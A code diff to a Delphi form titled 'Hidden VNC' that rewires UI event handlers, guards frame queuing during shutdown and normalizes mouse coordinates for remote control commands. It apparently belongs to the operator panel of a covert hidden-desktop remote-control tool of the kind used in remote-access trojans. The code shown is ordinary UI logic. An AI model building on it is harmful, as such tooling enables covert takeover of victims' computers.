@@ -138,6 +138,24 @@ begin
   FSendJSON   := ASendJSON;
   FUnregister := AUnregister;
   Caption     := 'Hidden VNC - ' + FClientID;
+
+  { Reset UI state }
+  FIsCapturing    := False;
+  Button1.Caption := 'Start Capturing';
+  Button1.OnClick := Button1Click;
+  Button2.OnClick := Button2Click;
+  Button3.OnClick := Button3Click;
+  ComboBox1.OnChange := ComboBox1Change;
+
+  OnClose := FormClose;
+  OnKeyDown := FormKeyDown;
+  OnKeyUp := FormKeyUp;
+
+  PaintBox1.OnMouseDown := PaintBox1MouseDown;
+  PaintBox1.OnMouseMove := PaintBox1MouseMove;
+  PaintBox1.OnMouseUp   := PaintBox1MouseUp;
+  PaintBox1.OnPaint     := PaintBox1Paint;
+
   LogToStatus('Ready');
 end;
 
@@ -224,6 +242,8 @@ end;
 
 procedure TForm10.QueueFrameBytes(const Bytes: TBytes);
 begin
+  if (csDestroying in ComponentState) then Exit;
+
   { Write bytes under lock; only the latest frame is kept (no queue buildup) }
   FLock.Enter;
   try
@@ -234,7 +254,7 @@ begin
   end;
 
   { Schedule decode + paint on UI thread }
-  TThread.Queue(nil,
+  System.Classes.TThread.Queue(nil,
     procedure
     begin
       if not (csDestroying in ComponentState) then
@@ -406,29 +426,25 @@ procedure TForm10.SendControlCommand(const Action: string;
   X, Y, Button, KeyCode: Integer);
 var
   JSONObj  : TJSONObject;
-  ScaledX  : Integer;
-  ScaledY  : Integer;
+  NormX    : Integer;
+  NormY    : Integer;
 begin
   if not FIsCapturing or not Assigned(FSendJSON) or not Assigned(FLine) then
     Exit;
 
-  { For mouse commands we need a valid remote resolution to scale against }
-  if (X <> -1) or (Y <> -1) then
-    if (FLastWidth = 0) or (FLastHeight = 0) then
-      Exit;
-
-  ScaledX := 0;
-  ScaledY := 0;
+  { Normalize mouse coordinates to 0-65535 range for resolution-independent scaling }
+  NormX := 0;
+  NormY := 0;
   if (X <> -1) and (PaintBox1.Width > 0) then
-    ScaledX := Round((X / PaintBox1.Width)  * FLastWidth);
+    NormX := Round((X / PaintBox1.Width)  * 65535);
   if (Y <> -1) and (PaintBox1.Height > 0) then
-    ScaledY := Round((Y / PaintBox1.Height) * FLastHeight);
+    NormY := Round((Y / PaintBox1.Height) * 65535);
 
   JSONObj := TJSONObject.Create;
   try
     JSONObj.AddPair('action', Action);
-    if X      <> -1 then JSONObj.AddPair('x',       TJSONNumber.Create(ScaledX));
-    if Y      <> -1 then JSONObj.AddPair('y',       TJSONNumber.Create(ScaledY));
+    if X      <> -1 then JSONObj.AddPair('x',       TJSONNumber.Create(NormX));
+    if Y      <> -1 then JSONObj.AddPair('y',       TJSONNumber.Create(NormY));
     if Button <> -1 then JSONObj.AddPair('button',  TJSONNumber.Create(Button));
     if KeyCode <> -1 then JSONObj.AddPair('keycode', TJSONNumber.Create(KeyCode));
     FSendJSON(FLine, JSONObj);
